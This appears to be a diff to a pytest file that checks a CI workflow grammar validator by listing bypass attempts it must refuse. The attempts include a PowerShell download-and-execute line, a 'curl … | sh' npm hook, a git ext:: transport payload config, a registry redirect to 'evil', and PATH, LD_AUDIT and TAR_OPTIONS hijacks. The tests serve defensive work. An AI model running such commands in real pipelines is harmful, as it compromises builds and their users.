@@ -6,13 +6,14 @@ version ranges at run time, so what CI tested, what the release built and what
 an operator installed could each be a different set of dependency versions.
 
 The rule is enforced by ``tests/workflow_grammar.py``: it parses each workflow,
-splits every ``run:`` into commands, and accepts only allowlisted programs and,
-for those that install, resolve or run other commands, only listed shapes; npm
-scripts are read from package.json and held to the same grammar. Its docstring
-says what it does not establish. The negative cases below are the bypasses
-reviewers found against the substring scanner it replaced and against its
-first version (two rounds), plus the obvious neighbours; each must be refused,
-and each negative template has a positive control.
+splits every ``run:`` into commands, and accepts a command only if it equals an
+entry of a closed table of reviewed templates (environment, redirections, the
+facts a command needs from earlier in its job, npm scripts and PowerShell steps
+likewise). Its docstring says what it does not establish. The negative cases
+below are the bypasses reviewers found against the substring scanner it
+replaced and against three earlier grammars that parsed program options, plus
+the obvious neighbours; each must be refused, and the positive controls show
+the refusals are for the command, not the template around it.
 """
 
 from __future__ import annotations
@@ -21,9 +22,17 @@ import json
 import re
 import tomllib
 from pathlib import Path
+from typing import Any
 
 import pytest
-from workflow_grammar import script_violations, split_commands, workflow_violations
+import workflow_grammar
+from workflow_grammar import (
+    PWSH_BODIES,
+    TEMPLATES,
+    script_violations,
+    split_commands,
+    workflow_violations,
+)
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
 WORKFLOWS = REPO_ROOT / ".github" / "workflows"
@@ -328,7 +337,248 @@ UNLOCKED_VARIANTS = {
         "",
         "      - run: PYTHON='pip install requests;' bash scripts/installed_package_smoke.sh",
     ),
+    # Round 3 (Sol B1-B4, DeepSeek BLOCK-1..3 and its non-blocking probes), verbatim.
+    "npx_playwright_without_npm_ci": (
+        "",
+        "      - run: npx playwright install --with-deps chromium",
+    ),
+    "npx_package_flag": ("", "      - run: npx --package cowsay playwright install"),
+    "npx_extra_flag": ("", "      - run: npx playwright install --yes chromium"),
+    "npx_playwright_extra_pkg": ("", "      - run: npx playwright install cowsay"),
+    "npx_playwright_install_deps": ("", "      - run: npx playwright install-deps chromium"),
+    "smoke_attacker_python": (
+        "",
+        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
+        " --format requirements.txt --output-file r.txt\n"
+        "          PYTHON=./attacker/python GPO_STUDIO_REQUIREMENTS=r.txt"
+        " bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_attacker_wheel": (
+        "",
+        "      - run: |\n          uv export --locked --no-default-groups --no-emit-project"
+        " --format requirements.txt --output-file r.txt\n"
+        "          GPO_STUDIO_WHEEL=attacker.whl GPO_STUDIO_REQUIREMENTS=r.txt"
+        " bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_attacker_requirements": (
+        "",
+        "      - run: GPO_STUDIO_REQUIREMENTS=attacker.txt bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_evil_wheel_abs": (
+        "",
+        "      - run: GPO_STUDIO_WHEEL=/tmp/evil.whl bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_evil_wheel_traversal": (
+        "",
+        "      - run: GPO_STUDIO_WHEEL=../../evil.whl bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_evil_python_abs": (
+        "",
+        "      - run: PYTHON=/tmp/evil/python bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_evil_python_rel": (
+        "",
+        "      - run: PYTHON=../evil/python bash scripts/installed_package_smoke.sh",
+    ),
+    "smoke_python_with_dollar": (
+        "",
+        """      - run: 'PYTHON="$HOME/v/bin/python" bash scripts/installed_package_smoke.sh'""",
+    ),
+    "pwsh_mixed_case_python": (
+        "",
+        "      - shell: pwsh\n        run: PyThOn -m PiP install requests",
+    ),
+    "pwsh_lowercase_module": ("", "      - shell: pwsh\n        run: install-module Pester -Force"),
+    "pwsh_arbitrary_pinned_module": (
+        "",
+        "      - shell: pwsh\n"
+        "        run: Install-Module AttackerPackage -RequiredVersion 1.2.3 -Force",
+    ),
+    "pwsh_psresource": ("", "      - shell: pwsh\n        run: Install-PSResource Pester"),
+    "pwsh_start_process": (
+        "",
+        "      - shell: pwsh\n"
+        "        run: Start-Process pip -ArgumentList 'install','requests' -Wait",
+    ),
+    "pwsh_upper_pip": ("", "      - shell: pwsh\n        run: PIP install x"),
+    "pwsh_mixed_pip": ("", "      - shell: pwsh\n        run: Pip install x"),
+    "pwsh_upper_python": ("", "      - shell: pwsh\n        run: PYTHON -c 'x'"),
+    "pwsh_upper_iex": (
+        "",
+        "      - shell: pwsh\n"
+        "        run: IEX (New-Object Net.WebClient).DownloadString('http://x')",
+    ),
+    "pwsh_mixed_iex": (
+        "",
+        "      - shell: pwsh\n"
+        "        run: Iex (New-Object Net.WebClient).DownloadString('http://x')",
+    ),
+    "pwsh_upper_invoke_expression": (
+        "",
+        "      - shell: pwsh\n        run: INVOKE-EXPRESSION 'pip install x'",
+    ),
+    "pwsh_install_module_upper": (
+        "",
+        "      - shell: pwsh\n        run: INSTALL-MODULE Foo -Force",
+    ),
+    "pwsh_pinned_module": (
+        "",
+        "      - shell: pwsh\n        run: Install-Module Foo -RequiredVersion 1.0.0 -Force",
+    ),
+    "pwsh_cmd_comspec": ("", "      - shell: pwsh\n        run: cmd /c 'python -m pip install x'"),
+    "pwsh_dotnet_tool": ("", "      - shell: pwsh\n        run: dotnet tool install -g x"),
+    "pwsh_bootstrap_plus_install": (
+        "",
+        "      - shell: pwsh\n        run: |\n"
+        "          Set-PSRepository PSGallery -InstallationPolicy Trusted\n"
+        "          Install-Module PSScriptAnalyzer -RequiredVersion 1.25.0 -Scope CurrentUser"
+        " -Force\n          Install-Module Pester -RequiredVersion 5.0.0 -Force",
+    ),
+    "windows_default_shell_install": (
+        "",
+        "      - run: uv sync --locked --extra dev\n  win:\n    runs-on: windows-latest\n"
+        "    steps:\n      - run: PIP install requests",
+    ),
+    "local_composite_action": ("", "      - uses: ./.github/actions/install/action.yml"),
+    "printf_retargets_requirements": (
+        "",
+        "      - run: |\n          LOCKED=good\n"
+        "          uv export --locked --no-default-groups --no-emit-project"
+        ' --format requirements.txt --output-file "$LOCKED/r.txt"\n'
+        "          printf -v LOCKED attacker\n"
+        '          pip install --require-hashes -r "$LOCKED/r.txt"',
+    ),
+    "printf_overrides_path": (
+        "",
+        "      - run: |\n          printf -v PATH './attacker:%s' \"$PATH\"\n          pip check",
+    ),
+    "cp_long_target_into_venv_bin": (
+        "",
+        "      - run: |\n          python -m venv /tmp/v\n"
+        "          cp --target-directory=/tmp/v/bin attacker/pip\n          /tmp/v/bin/pip check",
+    ),
+    "git_ext_transport_config": (
+        "",
+        "      - run: |\n          printf 'pip install requests\\n' > /tmp/p\n"
+        '          printf \'[protocol "ext"]\\n\\tallow = always\\n[remote "origin"]\\n'
+        "\\turl = ext::sh /tmp/p\\n\\tfetch = +refs/heads/*:refs/remotes/origin/*\\n'"
+        " > .git/config\n          git fetch origin",
+    ),
+    "git_global_config_ext": (
+        "",
+        "      - run: |\n"
+        "          printf '[protocol \"ext\"]\\n\\tallow = always\\n' > $HOME/.gitconfig\n"
+        "          git fetch 'ext::sh /tmp/payload'",
+    ),
+    "git_fetch_allowed_after_config_write": (
+        "",
+        "      - run: |\n          printf '[protocol \"ext\"]\\n\\tallow = always\\n'"
+        " > .git/config\n          git fetch --no-tags origin main",
+    ),
+    "curl_home": ("", "      - run: CURL_HOME=/tmp/evil curl -sf http://127.0.0.1:8799/"),
+    "curlrc_write": (
+        "",
+        "      - run: |\n          printf 'url = file:///etc/hostname\\n' > /tmp/evil/.curlrc\n"
+        "          curl -sf http://127.0.0.1:8799/",
+    ),
+    "curl_home_yaml_env": ("env: {CURL_HOME: /tmp/evil}", "      - run: echo hi"),
+    "write_so": ("", "      - run: printf 'x' > /tmp/evil.so"),
+    "write_whl": ("", "      - run: printf 'x' > /tmp/evil.whl"),
+    "write_tmp_python": ("", "      - run: printf '#!/bin/sh' > /tmp/evil/python"),
+    "write_git_config": ("", "      - run: echo x > .git/config"),
+    "cp_system_python": ("", "      - run: cp /usr/bin/python3 /tmp/evil/python"),
+    "redirect_over_python": ("", "      - run: echo x > /tmp/evil/python"),
+    "chmod_after": (
+        "",
+        "      - run: |\n          cp /bin/sh /tmp/evil/sh\n          chmod +x /tmp/evil/sh",
+    ),
+    "script_output_written": (
+        "",
+        "      - run: uv run --locked python scripts/check_safety.py > /tmp/evil/python",
+    ),
+    "install_cmd": ("", "      - run: install -m 755 /bin/sh /tmp/evil/python"),
+    "busybox": ("", "      - run: busybox sh -c 'pip install x'"),
+    "node_path_env": ("env: {NODE_PATH: /tmp/evil}", "      - run: echo hi"),
+    "ld_audit_env": ("env: {LD_AUDIT: /tmp/evil.so}", "      - run: echo hi"),
+    "gh_config_dir_env": ("env: {GH_CONFIG_DIR: /tmp/evil}", "      - run: echo hi"),
+    "dotnet_cli_home_env": ("env: {DOTNET_CLI_HOME: /tmp/evil}", "      - run: echo hi"),
+    "cargo_home_env": ("env: {CARGO_HOME: /tmp/evil}", "      - run: echo hi"),
+    "npm_token_env": ("env: {NPM_TOKEN: x}", "      - run: echo hi"),
+    "pip_foo_env": ("env: {PIP_FOO: x}", "      - run: echo hi"),
+    "xdg_config_home_env": ("env: {XDG_CONFIG_HOME: /tmp/evil}", "      - run: echo hi"),
+    "home_env": ("env: {HOME: /tmp/evil}", "      - run: echo hi"),
+    "allowed_name_other_value": ("env: {SOURCE_DATE_EPOCH: '0'}", "      - run: echo hi"),
+    "tar_options_inline": ("", "      - run: TAR_OPTIONS=--to-command=sh tar tzf x.tar.gz"),
+    "node_path_inline": ("", "      - run: NODE_PATH=/tmp/evil npm run check"),
+    "harmless_inline": ("", "      - run: FOO=bar python scripts/check_safety.py"),
+    "npm_exec": ("", "      - run: npm exec -- pip install x"),
+    "npm_publish": ("", "      - run: npm publish"),
+    "npm_test_alias": ("", "      - run: |\n          npm ci\n          npm test"),
+    "npm_run_format_writes_sources": (
+        "",
+        "      - run: |\n          npm ci\n          npm run format",
+    ),
+    "uv_lock_write": ("", "      - run: uv lock"),
+    "uv_run_npx": ("", "      - run: uv run --locked npx playwright install"),
+    "uv_run_group_other": ("", "      - run: uv run --locked --group foo python -c '1'"),
+    "uv_run_pip_locked_file": (
+        "",
+        "      - run: uv run --locked pip install --require-hashes -r x.txt",
+    ),
+    "process_substitution_python": ("", "      - run: python <(printf 'import os')"),
+    "process_substitution_bash": ("", "      - run: bash <(printf 'pip install x')"),
+    "function_definition": ("", "      - run: 'f() { pip install x; }; f'"),
+    "case_arm": (
+        "",
+        "      - run: |\n          case $x in\n            a) pip install requests ;;\n"
+        "            *) echo ok ;;\n          esac",
+    ),
+    "for_loop_retargets_variable": (
+        "",
+        "      - run: |\n          for LOCKED in attacker; do\n"
+        '            /tmp/smoke-venv/bin/pip install --require-hashes -r "$LOCKED/r.txt"\n'
+        "          done",
+    ),
+    "echo_option": ("", "      - run: echo -e '\\x70ip'"),
+    "unlisted_venv": (
+        "",
+        "      - run: |\n          python -m venv /tmp/evil-venv\n"
+        "          /tmp/evil-venv/bin/pip check",
+    ),
+    "venv_used_before_created": ("", "      - run: /tmp/smoke-venv/bin/pip check"),
+    "wheel_without_build": (
+        "",
+        "      - run: |\n          python -m venv /tmp/smoke-venv\n"
+        "          /tmp/smoke-venv/bin/pip install --no-deps --no-index dist/gpo_studio-*.whl",
+    ),
+    "input_redirect": (
+        "",
+        "      - run: uv run --locked python scripts/check_safety.py < /tmp/evil",
+    ),
+    "export_any": ("", "      - run: export FOO=bar"),
+    "runner_expression": (
+        "",
+        "      - run: uv sync --locked --extra dev\n  matrix-os:\n"
+        "    runs-on: ${{ matrix.os }}\n    steps:\n      - run: uv sync --locked --extra dev",
+    ),
+    "runner_self_hosted_windows": (
+        "",
+        "      - run: uv sync --locked --extra dev\n  labelled:\n"
+        "    runs-on: [self-hosted, win]\n    steps:\n      - run: uv sync --locked --extra dev",
+    ),
 }
+
+# Build, export and hand over a wheel exactly as release.yml does.
+_HAND_OFF = (
+    "      - run: uv run --locked --only-group release python -m build --no-isolation"
+    " --outdir dist\n"
+    "      - run: uv export --locked --no-default-groups --no-emit-project"
+    " --format requirements.txt --output-file requirements-lock.txt\n"
+    "      - run: |\n"
+    "          WHEEL=$(find dist -maxdepth 1 -name 'gpo_studio-*.whl' -print -quit)\n"
+    '          PYTHON=python GPO_STUDIO_WHEEL="$WHEEL"'
+    " GPO_STUDIO_REQUIREMENTS=requirements-lock.txt bash scripts/installed_package_smoke.sh"
+)
 
 
 @pytest.mark.parametrize("name", sorted(UNLOCKED_VARIANTS))
@@ -348,27 +598,119 @@ def test_the_negative_template_itself_is_accepted(tmp_path: Path) -> None:
     assert workflow_violations(workflow) == []
 
 
+def _verdict(tmp_path: Path, steps: str, *, env: str = "") -> list[str]:
+    workflow = tmp_path / "probe.yml"
+    workflow.write_text(_STEP.format(env=env, steps=steps), encoding="utf-8")
+    return workflow_violations(workflow)
+
+
+def test_every_template_is_reviewed_and_used_by_a_real_command(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The table is derived from what the workflows run: an unused entry is an allowance."""
+    used: set[workflow_grammar.Template] = set()
+    original = workflow_grammar._match
+
+    def recording(template: workflow_grammar.Template, tokens: tuple[str, ...]) -> Any:
+        found = original(template, tokens)
+        if found is not None:
+            used.add(template)
+        return found
+
+    monkeypatch.setattr(workflow_grammar, "_match", recording)
+    for path in WORKFLOW_FILES:
+        workflow_violations(path)
+    script_violations(SMOKE)
+    unused = [" ".join(template.tokens) for template in TEMPLATES if template not in used]
+    assert unused == []
+    assert all(template.why.strip() for template in TEMPLATES)
+    assert len(set(TEMPLATES)) == len(TEMPLATES)
+
+
+def test_npx_playwright_needs_npm_ci_in_the_same_job(tmp_path: Path) -> None:
+    """Sol r3 B4: without the lock installed, npx fetches playwright from the registry."""
+    install = "      - run: npx playwright install --with-deps chromium firefox"
+    (problem,) = _verdict(tmp_path, install)
+    assert "npm-ci" in problem
+    assert _verdict(tmp_path, f"      - run: npm ci\n{install}") == []
+
+
+def test_exported_requirements_do_not_cross_jobs(tmp_path: Path) -> None:
+    """Sol r3 B5: jobs are separate machines; a producer job's export is not the consumer's."""
+    export = (
+        "uv export --locked --no-default-groups --no-emit-project --format requirements.txt"
+        " --output-file requirements-lock.txt"
+    )
+    install = (
+        "python -m venv /tmp/wheel-venv\n"
+        "          /tmp/wheel-venv/bin/pip install --require-hashes -r requirements-lock.txt"
+    )
+    cross = (
+        f"      - run: {export}\n  consumer:\n    runs-on: ubuntu-latest\n    steps:\n"
+        f"      - run: |\n          {install}"
+    )
+    (problem,) = _verdict(tmp_path, cross)
+    assert "lock:requirements-lock.txt" in problem
+    assert _verdict(tmp_path, f"      - run: {export}\n      - run: |\n          {install}") == []
+
+
+def test_the_smoke_script_hand_off_is_this_jobs_wheel_and_lock(tmp_path: Path) -> None:
+    """Sol r3 B2: PYTHON is `python`, the wheel is the one built here, the lock exported here."""
+    assert _verdict(tmp_path, _HAND_OFF) == []
+    without_build = _HAND_OFF.split("\n", 1)[1]
+    assert _verdict(tmp_path, without_build)
+    for changed in ("PYTHON=python3", 'GPO_STUDIO_WHEEL="dist/x.whl"', "=requirements.txt"):
+        original = {
+            "PYTHON=python3": "PYTHON=python",
+            "=requirements.txt": "=requirements-lock.txt",
+        }
+        old = original.get(changed, 'GPO_STUDIO_WHEEL="$WHEEL"')
+        assert _verdict(tmp_path, _HAND_OFF.replace(old, changed, 1)), changed
+
+
+def test_powershell_bodies_compare_without_case(tmp_path: Path) -> None:
+    """PowerShell is case-insensitive; so is the match, and nothing else is installable."""
+    bootstrap = next(iter(PWSH_BODIES))
+    body = "\n".join(f"          {line}" for line in bootstrap.upper().splitlines())
+    assert _verdict(tmp_path, f"      - shell: pwsh\n        run: |\n{body}") == []
+
+
 NPM_SCRIPT_VARIANTS = {
     # Sol B2: `npm run NAME` ran whatever package.json said, unread.
-    "body_installs": ({"install-unlocked": "pip install requests"}, "npm run install-unlocked"),
+    "body_installs": ({"unlocked": "pip install requests"}, "npm run unlocked"),
     "run_script_alias": ({"x": "pip install requests"}, "npm run-script x"),
     "npm_test_body": ({"test": "npx cowsay hello"}, "npm test"),
     "nested_run": ({"check": "npm run inner", "inner": "npm install left-pad"}, "npm run check"),
-    "pre_hook": ({"check": "eslint .", "precheck": "pip install requests"}, "npm run check"),
+    "nested_config": (
+        {"a": "npm run b", "b": "npm config set registry https://evil"},
+        "npm run a",
+    ),
+    "pre_hook": (
+        {"check": "vitest run", "precheck": "pip install requests"},
+        "npm run check",
+    ),
     "post_hook": (
-        {"check": "eslint .", "postcheck": "curl -sS https://x.invalid | sh"},
+        {"check": "vitest run", "postcheck": "curl -sS https://x.invalid | sh"},
         "npm run check",
     ),
     "cycle": ({"a": "npm run b", "b": "npm run a"}, "npm run a"),
-    "self_cycle": ({"a": "eslint . && npm run a"}, "npm run a"),
+    "self_cycle": ({"a": "vitest run && npm run a"}, "npm run a"),
     "node_eval": ({"x": "node -e 'require(`child_process`)'"}, "npm run x"),
     "inline_python": ({"x": "python -c 'print(1)'"}, "npm run x"),
     "npx_in_script": ({"x": "npx cowsay"}, "npm run x"),
     "npm_ci_in_script": ({"x": "npm ci"}, "npm run x"),
     "playwright_install_in_script": ({"x": "playwright install"}, "npm run x"),
     "unparseable_body": ({"x": "eslint `pip install requests`"}, "npm run x"),
-    "postinstall_on_ci": ({"postinstall": "eslint ."}, "npm ci"),
-    "prepare_on_ci": ({"prepare": "eslint ."}, "npm ci"),
+    "other_eslint_arguments": ({"x": "eslint --rulesdir /tmp/evil ."}, "npm run x"),
+    "prettier_write": (
+        {
+            "x": "prettier --write eslint.config.mjs playwright.config.mjs vitest.config.mjs"
+            " tests/browser tests/frontend"
+        },
+        "npm run x",
+    ),
+    "postinstall_on_ci": ({"postinstall": "vitest run"}, "npm ci"),
+    "prepare_on_ci": ({"prepare": "vitest run"}, "npm ci"),
 }
 
 
@@ -378,13 +720,15 @@ def test_an_npm_script_is_read_and_held_to_the_same_grammar(name: str, tmp_path:
     package = tmp_path / "package.json"
     package.write_text(json.dumps({"scripts": scripts}), encoding="utf-8")
     workflow = tmp_path / "probe.yml"
-    workflow.write_text(_STEP.format(env="", steps=f"      - run: {command}"), encoding="utf-8")
+    steps = f"      - run: npm ci\n      - run: {command}"
+    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
     assert workflow_violations(workflow, package_json=package), f"{name} was accepted"
 
 
 def test_the_npm_negative_template_itself_is_accepted(tmp_path: Path) -> None:
     package = tmp_path / "package.json"
-    scripts = {"check": "npm run lint && vitest run", "lint": "eslint .", "precheck": "true"}
+    lint = "eslint src/gpo_studio/static/js tests/browser tests/frontend *.config.mjs"
+    scripts = {"check": "npm run lint && vitest run", "lint": lint, "precheck": "vitest run"}
     package.write_text(json.dumps({"scripts": scripts}), encoding="utf-8")
     workflow = tmp_path / "probe.yml"
     steps = "      - run: npm ci\n      - run: npm run check"
@@ -392,46 +736,13 @@ def test_the_npm_negative_template_itself_is_accepted(tmp_path: Path) -> None:
     assert workflow_violations(workflow, package_json=package) == []
 
 
-def test_every_real_npm_script_is_in_the_grammar(tmp_path: Path) -> None:
-    """Including ones no workflow runs today, so adding a workflow line cannot surprise."""
+def test_every_real_npm_script_but_format_is_in_the_grammar(tmp_path: Path) -> None:
+    """`format` rewrites tracked sources, so no workflow may run it; every other one may."""
     scripts = json.loads((REPO_ROOT / "package.json").read_text(encoding="utf-8"))["scripts"]
-    commands = ["npm ci", "npm test", *(f"npm run {name}" for name in sorted(scripts))]
-    workflow = tmp_path / "probe.yml"
-    steps = "".join(f"      - run: {command}\n" for command in commands)
-    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
-    assert workflow_violations(workflow) == []
-
-
-def test_the_smoke_script_hand_off_is_accepted_only_from_an_export(tmp_path: Path) -> None:
-    """The release passes the smoke script a requirements file it exported from uv.lock."""
-    workflow = tmp_path / "probe.yml"
-    steps = (
-        "      - run: uv export --locked --no-default-groups --no-emit-project"
-        " --format requirements.txt --output-file requirements-lock.txt\n"
-        "      - run: PYTHON=python GPO_STUDIO_REQUIREMENTS=requirements-lock.txt"
-        " bash scripts/installed_package_smoke.sh"
-    )
-    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
-    assert workflow_violations(workflow) == []
-
-
-def test_a_requirements_file_is_accepted_through_a_variable_naming_the_export(
-    tmp_path: Path,
-) -> None:
-    workflow = tmp_path / "probe.yml"
-    steps = (
-        "      - run: uv export --locked --no-default-groups --no-emit-project"
-        ' --format requirements.txt --output-file "$RUNNER_TEMP/l/r.txt"\n'
-        "      - run: |\n"
-        '          LOCKED="$RUNNER_TEMP/l"\n'
-        '          /tmp/v/bin/pip install --require-hashes -r "$LOCKED/r.txt"\n'
-        '          LOCKED="$RUNNER_TEMP/elsewhere"\n'
-        '          /tmp/v/bin/pip install --require-hashes -r "$LOCKED/r.txt"'
-    )
-    workflow.write_text(_STEP.format(env="", steps=steps), encoding="utf-8")
-    # The first install is the export; the second could be any file of that name.
-    (problem,) = workflow_violations(workflow)
-    assert "not a `uv export --locked` output" in problem
+    runnable = sorted(set(scripts) - {"format"})
+    steps = "".join(f"      - run: npm run {name}\n" for name in runnable)
+    assert _verdict(tmp_path, f"      - run: npm ci\n{steps}") == []
+    assert _verdict(tmp_path, "      - run: npm ci\n      - run: npm run format")
 
 
 def test_ci_checks_the_lockfile_matches_pyproject() -> None:
